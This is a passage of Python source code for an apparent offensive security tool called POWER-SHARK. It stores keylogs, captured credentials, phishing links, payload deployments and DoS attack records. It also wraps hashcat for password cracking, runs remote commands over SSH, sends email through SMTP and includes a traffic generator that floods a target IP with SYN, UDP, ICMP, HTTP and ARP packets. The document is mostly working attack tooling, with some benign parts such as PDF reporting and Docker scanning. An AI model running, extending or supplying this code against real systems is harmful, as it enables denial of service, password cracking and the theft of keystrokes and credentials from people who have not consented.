                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
            stats['total_monitors'] = self.conn.execute("SELECT COUNT(*) FROM threat_monitors").fetchone()[0]
        except:
            pass
        return stats
    
    def save_keylog(self, text: str, window: str = "", process: str = "") -> bool:
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process) VALUES (?, ?, ?)",
                (text[:5000], window[:100], process[:100])
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save keylog: {e}")
            return False
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def save_deployment(self, deployment: Deployment) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update deployment: {e}")
    
    def save_clipboard(self, content: str, source: str = "system") -> bool:
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_email(self, email_msg: EmailMessage) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO email_messages 
                   (to_address, subject, body, from_address, html, attachments, status, sent_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_msg.to, email_msg.subject, email_msg.body, email_msg.from_email,
                 1 if email_msg.html else 0, json.dumps(email_msg.attachments),
                 email_msg.status, email_msg.sent_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save email: {e}")
            return False
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages WHERE status = ? ORDER BY created_at DESC LIMIT ?",
                    (status, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            emails = []
            for row in rows:
                email = dict(row)
                email['attachments'] = json.loads(email['attachments']) if email['attachments'] else []
                emails.append(email)
            return emails
        except:
            return []
    
    def update_email_status(self, email_id: int, status: str) -> bool:
        try:
            self.conn.execute(
                "UPDATE email_messages SET status = ?, sent_at = CURRENT_TIMESTAMP WHERE id = ?",
                (status, email_id)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def save_pdf_report(self, report: PDFReport) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO pdf_reports 
                   (title, target, analysis, file_path, status)
                   VALUES (?, ?, ?, ?, ?)""",
                (report.title, report.target, json.dumps(report.analysis),
                 report.file_path, report.status)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save PDF report: {e}")
            return False
    
    def get_pdf_reports(self, limit: int = 20) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM pdf_reports ORDER BY created_at DESC LIMIT ?",
                (limit,)
            )
            reports = []
            for row in rows:
                report = dict(row)
                report['analysis'] = json.loads(report['analysis']) if report['analysis'] else {}
                reports.append(report)
            return reports
        except:
            return []
    
    def add_threat_monitor(self, target: str, scan_type: str, interval: int = 300) -> bool:
        try:
            next_scan = datetime.datetime.now() + datetime.timedelta(seconds=interval)
            self.conn.execute(
                """INSERT INTO threat_monitors (target, scan_type, interval, enabled, next_scan)
                   VALUES (?, ?, ?, 1, ?)""",
                (target, scan_type, interval, next_scan.isoformat())
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add threat monitor: {e}")
            return False
    
    def get_threat_monitors(self, enabled_only: bool = True) -> List[Dict]:
        try:
            if enabled_only:
                rows = self.conn.execute("SELECT * FROM threat_monitors WHERE enabled = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM threat_monitors ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_threat_monitor_scan(self, monitor_id: int) -> bool:
        try:
            monitor = self.conn.execute(
                "SELECT interval FROM threat_monitors WHERE id = ?", (monitor_id,)
            ).fetchone()
            if monitor:
                next_scan = datetime.datetime.now() + datetime.timedelta(seconds=monitor['interval'])
                self.conn.execute(
                    "UPDATE threat_monitors SET last_scan = CURRENT_TIMESTAMP, next_scan = ? WHERE id = ?",
                    (next_scan.isoformat(), monitor_id)
                )
                self.conn.commit()
            return True
        except:
            return False
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# EMAIL COMPOSER ENGINE
# =====================
class EmailComposerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.smtp_server = config.get('email.smtp_server', '')
        self.smtp_port = config.get('email.smtp_port', 587)
        self.smtp_username = config.get('email.smtp_username', '')
        self.smtp_password = config.get('email.smtp_password', '')
        self.from_email = config.get('email.from_email', '')
        self.tls = config.get('email.tls', True)
    
    def compose_email(self, to: str, subject: str, body: str, 
                      from_email: str = None, html: bool = False,
                      attachments: List[str] = None) -> EmailMessage:
        email_msg = EmailMessage(
            to=to,
            subject=subject,
            body=body,
            from_email=from_email or self.from_email,
            attachments=attachments or [],
            html=html,
            status="draft"
        )
        self.db.save_email(email_msg)
        return email_msg
    
    def send_email(self, email_id: int) -> Dict[str, Any]:
        emails = self.db.get_emails(limit=100)
        email_data = next((e for e in emails if e['id'] == email_id), None)
        
        if not email_data:
            return {'success': False, 'error': f'Email {email_id} not found'}
        
        if email_data['status'] == 'sent':
            return {'success': False, 'error': 'Email already sent'}
        
        if not self.smtp_server or not self.smtp_username or not self.smtp_password:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        try:
            msg = MIMEMultipart()
            msg['From'] = email_data['from_address']
            msg['To'] = email_data['to_address']
            msg['Subject'] = email_data['subject']
            
            if email_data['html']:
                msg.attach(MIMEText(email_data['body'], 'html'))
            else:
                msg.attach(MIMEText(email_data['body'], 'plain'))
            
            attachments = json.loads(email_data['attachments']) if email_data['attachments'] else []
            for attachment_path in attachments:
                if os.path.exists(attachment_path):
                    with open(attachment_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename={os.path.basename(attachment_path)}'
                        )
                        msg.attach(part)
            
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                if self.tls:
                    server.starttls()
                server.login(self.smtp_username, self.smtp_password)
                server.send_message(msg)
            
            self.db.update_email_status(email_id, 'sent')
            
            return {
                'success': True,
                'message': f'Email sent to {email_data["to_address"]}',
                'email_id': email_id
            }
        except Exception as e:
            self.db.update_email_status(email_id, 'failed')
            return {'success': False, 'error': str(e)}
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        return self.db.get_emails(status, limit)
    
    def delete_email(self, email_id: int) -> bool:
        try:
            self.db.conn.execute("DELETE FROM email_messages WHERE id = ?", (email_id,))
            self.db.conn.commit()
            return True
        except:
            return False

# =====================
# PDF REPORT GENERATOR
# =====================
class PDFReportGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.pdf_available = PDF_AVAILABLE
    
    def generate_report(self, title: str, target: str, analysis: Dict) -> Dict[str, Any]:
        if not self.pdf_available:
            return {'success': False, 'error': 'PDF generation not available (reportlab missing)'}
        
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"power_shark_report_{target.replace('/', '_').replace(':', '_')}_{timestamp}.pdf"
            filepath = os.path.join(PDF_REPORTS_DIR, filename)
            
            doc = SimpleDocTemplate(
                filepath,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=colors.black,
                alignment=0,
                spaceAfter=30
            )
            
            story = []
            story.append(Paragraph("POWER-SHARK Security Report", title_style))
            story.append(Spacer(1, 12))
            
            metadata = [
                ['Title:', title],
                ['Target:', target],
                ['Generated:', datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
                ['Tool:', f"POWER-SHARK v{VERSION}"],
                ['Author:', AUTHOR]
            ]
            
            meta_table = Table(metadata, colWidths=[100, 400])
            meta_table.setStyle(TableStyle([
                ('FONTNAME', (0, 0), (-1, -1), 'Courier'),
                ('FONTSIZE', (0, 0), (-1, -1), 10),
                ('TEXTCOLOR', (0, 0), (0, -1), colors.grey),
                ('TEXTCOLOR', (1, 0), (1, -1), colors.black),
                ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
            ]))
            story.append(meta_table)
            story.append(Spacer(1, 20))
            
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary = f"""This report presents a comprehensive security analysis of <b>{target}</b>. 
            The assessment was performed using POWER-SHARK's automated scanning and threat monitoring capabilities."""
            story.append(Paragraph(summary, styles['Normal']))
            story.append(Spacer(1, 15))
            
            for key, value in analysis.items():
                if isinstance(value, dict):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for sub_key, sub_value in value.items():
                        if not isinstance(sub_value, (dict, list)):
                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
                    story.append(Spacer(1, 10))
                elif isinstance(value, list):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for item in value[:20]:
                        if isinstance(item, dict):
                            item_text = ', '.join([f"{k}: {v}" for k, v in item.items() if not isinstance(v, (dict, list))])
                            story.append(Paragraph(f"• {item_text}", styles['Normal']))
                        else:
                            story.append(Paragraph(f"• {item}", styles['Normal']))
                    story.append(Spacer(1, 10))
                else:
                    story.append(Paragraph(f"{key.replace('_', ' ').title()}: {value}", styles['Normal']))
            
            if 'recommendations' in analysis:
                story.append(Paragraph("Recommendations", styles['Heading2']))
                for rec in analysis['recommendations']:
                    story.append(Paragraph(f"• {rec}", styles['Normal']))
                story.append(Spacer(1, 15))
            
            story.append(Spacer(1, 30))
            story.append(Paragraph(
                f"Report generated by POWER-SHARK v{VERSION} | {AUTHOR} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                styles['Italic']
            ))
            
            doc.build(story)
            
            report = PDFReport(
                title=title,
                target=target,
                analysis=analysis,
                timestamp=datetime.datetime.now().isoformat(),
                file_path=filepath,
                status="generated"
            )
            self.db.save_pdf_report(report)
            
            return {
                'success': True,
                'file_path': filepath,
                'message': f'PDF report generated: {filename}'
            }
        except Exception as e:
            logger.error(f"PDF generation error: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_reports(self, limit: int = 20) -> List[Dict]:
        return self.db.get_pdf_reports(limit)

# =====================
# CRACKING ENGINE
# =====================
class CrackingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_jobs = {}
        self.hashcat_path = config.get('cracking.hashcat_path', 'hashcat')
        self.wordlist_path = config.get('cracking.wordlist_path', '/usr/share/wordlists/rockyou.txt')
        self.default_hash_type = config.get('cracking.default_hash_type', 0)
    
    def crack_hash(self, hash_type: str, hash_value: str, wordlist: str = None) -> str:
        job_id = str(uuid.uuid4())[:8]
        wordlist = wordlist or self.wordlist_path
        
        self.db.save_cracking_job(job_id, hash_type, hash_value, wordlist)
        
        thread = threading.Thread(target=self._run_hashcat, args=(job_id, hash_type, hash_value, wordlist))
        thread.daemon = True
        thread.start()
        
        return job_id
    
    def _run_hashcat(self, job_id: str, hash_type: str, hash_value: str, wordlist: str):
        self.db.update_cracking_job(job_id, 'running')
        
        try:
            hash_type_num = self._get_hash_type_num(hash_type)
            
            if not shutil.which(self.hashcat_path):
                result = self._crack_with_python(hash_type, hash_value, wordlist)
                if result:
                    self.db.update_cracking_job(job_id, 'completed', result, True)
                else:
                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
                return
            
            cmd = [
                self.hashcat_path,
                '-m', str(hash_type_num),
                '-a', '0',
                '-o', os.path.join(CRACKING_DIR, f"{job_id}_result.txt"),
                '--potfile-path', os.path.join(CRACKING_DIR, f"{job_id}.pot"),
                hash_value,
                wordlist
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read().strip()
                    if ':' in content:
                        cracked = content.split(':', 1)[1]
                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
                    else:
                        self.db.update_cracking_job(job_id, 'completed', content, True)
            else:
                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
        except subprocess.TimeoutExpired:
            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
        except Exception as e:
            self.db.update_cracking_job(job_id, 'failed', str(e), False)
    
    def _get_hash_type_num(self, hash_type: str) -> int:
        hash_types = {
            'md5': 0, 'sha1': 100, 'sha256': 1400, 'sha512': 1700,
            'ntlm': 1000, 'mysql': 200, 'mysql5': 300, 'postgres': 12,
            'mssql': 131, 'oracle': 3100, 'bcrypt': 3200, 'scrypt': 8900,
            'md5_utf8': 10, 'sha1_utf8': 110, 'sha256_utf8': 1410, 'sha512_utf8': 1710
        }
        return hash_types.get(hash_type.lower(), self.default_hash_type)
    
    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
        try:
            if not os.path.exists(wordlist):
                return None
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if not word:
                        continue
                    if hash_type.lower() == 'md5':
                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha1':
                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha256':
                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha512':
                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
                            return word
            return None
        except:
            return None
    
    def get_job_status(self, job_id: str) -> Optional[Dict]:
        jobs = self.db.get_cracking_jobs()
        for job in jobs:
            if job['job_id'] == job_id:
                return dict(job)
        return None
    
    def get_all_jobs(self) -> List[Dict]:
        return self.db.get_cracking_jobs()

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
            severity = self._determine_severity(vulnerabilities)
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line or 'LOW' in line:
                severity = 'critical' if 'CRITICAL' in line else 'high' if 'HIGH' in line else 'medium' if 'MEDIUM' in line else 'low'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'
    
    def docker_info(self) -> Dict:
        try:
            result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=30)
            return {'success': result.returncode == 0, 'output': result.stdout or result.stderr}
        except:
            return {'success': False, 'output': 'Docker not available'}
    
    def docker_ps(self) -> Dict:
        try:
            result = subprocess.run(['docker', 'ps'], capture_output=True, text=True, timeout=30)
            return {'success': result.returncode == 0, 'output': result.stdout or result.stderr}
        except:
            return {'success': False, 'output': 'Docker not available'}
    
    def docker_images(self) -> Dict:
        try:
            result = subprocess.run(['docker', 'images'], capture_output=True, text=True, timeout=30)
            return {'success': result.returncode == 0, 'output': result.stdout or result.stderr}
        except:
            return {'success': False, 'output': 'Docker not available'}
    
    def docker_bench(self) -> Dict:
        try:
            result = subprocess.run(
                ['docker', 'run', '--rm', '--net', 'host', '--pid', 'host',
                 '--cap-add', 'audit_control', '-v', '/var/lib:/var/lib',
                 '-v', '/var/run/docker.sock:/var/run/docker.sock',
                 '-v', '/etc:/etc', '-v', '/usr/lib/systemd:/usr/lib/systemd',
                 'docker/docker-bench-security'],
                capture_output=True, text=True, timeout=300
            )
            return {'success': result.returncode == 0, 'output': result.stdout}
        except:
            return {'success': False, 'output': 'Docker Bench Security failed'}

# =====================
# SSH MANAGER
# =====================
class SSHManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.connections: Dict[str, Any] = {}
    
    def is_available(self) -> bool:
        return PARAMIKO_AVAILABLE
    
    def add_connection(self, name: str, host: str, username: str,
                      password: str = None, key_path: str = None,
                      port: int = 22) -> SSHConnection:
        conn_id = str(uuid.uuid4())[:8]
        conn = SSHConnection(
            id=conn_id, name=name, host=host, port=port, username=username,
            password=password, key_path=key_path,
            created_at=datetime.datetime.now().isoformat()
        )
        self.db.add_ssh_connection(conn)
        return conn
    
    def connect(self, conn_id: str) -> bool:
        if not self.is_available():
            return False
        rows = self.db.get_ssh_connections()
        conn_data = next((c for c in rows if c['id'] == conn_id), None)
        if not conn_data:
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            connect_kwargs = {
                'hostname': conn_data['host'],
                'port': conn_data['port'],
                'username': conn_data['username'],
                'timeout': 30
            }
            if conn_data['password_encrypted']:
                connect_kwargs['password'] = conn_data['password_encrypted']
            elif conn_data['key_path'] and os.path.exists(conn_data['key_path']):
                connect_kwargs['key_filename'] = conn_data['key_path']
            client.connect(**connect_kwargs)
            self.connections[conn_id] = client
            self.db.conn.execute(
                "UPDATE ssh_connections SET status = 'connected' WHERE id = ?",
                (conn_id,)
            )
            self.db.conn.commit()
            return True
        except Exception as e:
            logger.error(f"SSH connection error: {e}")
            return False
    
    def disconnect(self, conn_id: str):
        if conn_id in self.connections:
            try:
                self.connections[conn_id].close()
                del self.connections[conn_id]
            except:
                pass
        self.db.conn.execute(
            "UPDATE ssh_connections SET status = 'disconnected' WHERE id = ?",
            (conn_id,)
        )
        self.db.conn.commit()
    
    def execute_command(self, conn_id: str, command: str, timeout: int = 30) -> CommandResult:
        start_time = time.time()
        if conn_id not in self.connections:
            if not self.connect(conn_id):
                return CommandResult(False, "", 0, "Not connected")
        client = self.connections[conn_id]
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            execution_time = time.time() - start_time
            return CommandResult(
                success=exit_code == 0,
                output=output + ("\n" + error if error else ""),
                execution_time=execution_time,
                error=None if exit_code == 0 else error
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(False, "", execution_time, str(e))
    
    def get_connections(self) -> List[Dict]:
        rows = self.db.get_ssh_connections()
        for row in rows:
            row['connected'] = row['id'] in self.connections
        return rows

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        generator = TrafficGenerator(
            id=generator_id, traffic_type=traffic_type, target_ip=target_ip,
            target_port=port, duration=duration, status="running"
        )
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int, stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        func = self._get_generator_func(generator.traffic_type)
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except:
                time.sleep(0.1)
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp, 'tcp_syn': self._tcp_syn, 'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect, 'udp': self._udp, 'http_get': self._http_get,
            'http_post': self._http_post, 'https': self._https, 'dns': self._dns,
            'arp': self._arp, 'mixed': self._mixed, 'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target], capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"POWERSHARK"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"POWERSHARK", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "POWER-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data", headers={"User-Agent": "POWER-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "POWER-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
